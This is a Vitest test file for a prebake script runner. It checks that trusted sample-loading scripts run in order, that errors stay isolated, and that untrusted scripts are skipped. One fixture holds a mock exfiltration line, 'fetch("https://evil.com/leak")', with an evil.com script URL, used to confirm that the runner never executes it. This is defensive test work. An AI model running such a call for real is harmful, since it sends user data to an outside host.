import { describe, it, expect, vi } from 'vitest'
import { runPrebake } from '../../src/prebake/runner'
import type { PrebakeScript } from '../../src/storage/db'

describe('prebake runner', () => {
  it('executes trusted scripts in sequence', async () => {
    const executed: string[] = []
    const evalFn = vi.fn().mockImplementation(async (code: string) => {
      executed.push(code)
      return { ok: true }
    })

    const scripts: PrebakeScript[] = [
      {
        id: '1',
        name: 'Pack A',
        source: 'inline',
        code: 'samples("pack-a")',
        trusted: true,
        updatedAt: 1,
      },
      {
        id: '2',
        name: 'Pack B',
        source: 'inline',
        code: 'samples("pack-b")',
        trusted: true,
        updatedAt: 2,
      },
    ]

    const report = await runPrebake(scripts, evalFn)
    expect(report.hasErrors).toBe(false)
    expect(report.untrustedCount).toBe(0)
    expect(report.results).toHaveLength(2)
    expect(report.results[0].executed).toBe(true)
    expect(report.results[1].executed).toBe(true)
    expect(executed).toEqual(['samples("pack-a")', 'samples("pack-b")'])
  })

  it('skips untrusted scripts for safety', async () => {
    const evalFn = vi.fn()
    const scripts: PrebakeScript[] = [
      {
        id: '1',
        name: 'External Untrusted',
        source: 'url',
        url: 'https://evil.com/hack.js',
        code: 'fetch("https://evil.com/leak")',
        trusted: false,
        updatedAt: 1,
      },
    ]

    const report = await runPrebake(scripts, evalFn)
    expect(evalFn).not.toHaveBeenCalled()
    expect(report.untrustedCount).toBe(1)
    expect(report.results[0].executed).toBe(false)
    expect(report.results[0].skippedReason).toBe('untrusted')
  })

  it('isolates errors so subsequent scripts continue running', async () => {
    const executed: string[] = []
    const evalFn = vi.fn().mockImplementation(async (code: string) => {
      if (code.includes('fail')) {
        throw new Error('Synth registration failed')
      }
      executed.push(code)
    })

    const scripts: PrebakeScript[] = [
      {
        id: '1',
        name: 'Failing Script',
        source: 'inline',
        code: 'throw "fail"',
        trusted: true,
        updatedAt: 1,
      },
      {
        id: '2',
        name: 'Working Script',
        source: 'inline',
        code: 'samples("pack-good")',
        trusted: true,
        updatedAt: 2,
      },
    ]

    const report = await runPrebake(scripts, evalFn)
    expect(report.hasErrors).toBe(true)
    expect(report.results[0].executed).toBe(true)
    expect(report.results[0].error).toContain('Synth registration failed')
    expect(report.results[1].executed).toBe(true)
    expect(report.results[1].error).toBeUndefined()
    expect(executed).toEqual(['samples("pack-good")'])
  })
})
